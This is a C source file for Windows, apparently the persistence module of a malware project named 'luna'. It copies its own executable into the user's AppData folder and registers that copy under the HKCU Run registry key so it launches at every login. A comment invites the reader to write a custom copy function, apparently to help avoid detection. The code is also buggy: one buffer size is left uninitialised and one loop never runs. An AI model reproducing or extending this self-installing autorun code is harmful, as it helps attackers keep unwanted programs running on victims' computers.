#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "luna.h"

char installLocation[265];

short checkStart(){
      short err = 0;

      HKEY res;
      if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS,&res) != ERROR_SUCCESS)
            return 0;
      unsigned char *buffer = malloc(800);

      DWORD bufferSize;
      if(RegQueryValueExA(res, "luna", RESERVED, NO_TYPE, buffer, &bufferSize) != ERROR_SUCCESS)
            goto checkStart_cleanup;
      buffer = realloc(buffer, bufferSize);
      if(!buffer)
            goto checkStart_cleanup;

      if(strcmp((const char *)buffer,installLocation) != 0)
            goto checkStart_cleanup_two;

      err = !0;
      checkStart_cleanup_two:
            memset(buffer, 0,bufferSize);
            free(buffer);
      checkStart_cleanup:
            RegCloseKey(res);
      return err;
}
short init(){
      GetEnvironmentVariableA("appdata", installLocation, 200);
      strcat(installLocation,"\\l.u.n.a");
      return 0;
}
void d_init(){
      memset(installLocation, 0, 265);
}
short addStart(){
      HKEY hkey;
      if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS,&hkey) != ERROR_SUCCESS)
            return 0;
      if(RegSetValueExA(hkey, "luna", 0, REG_SZ, (const BYTE *)installLocation, strlen(installLocation)) != ERROR_SUCCESS){
            RegCloseKey(hkey);
            return 0;
      }

      RegCloseKey(hkey);
      return 1;
}
void copySelf(char *loc){
      size_t size;
      for(size = strlen(loc) ; size < 0 ; size--)
            if(loc[size]=='\\')
                  loc = loc + size;

      CopyFile(loc,installLocation,0); //you might want to create your own copy function.
}
int main(int argc , char **argv){
      init();
      if(!checkStart())
            addStart();
      //if(GetFileAttributesA(installLocation) == INVALID_FILE_ATTRIBUTES)
      copySelf(argv[0]);

      d_init();
      getchar();
      return 0;
}
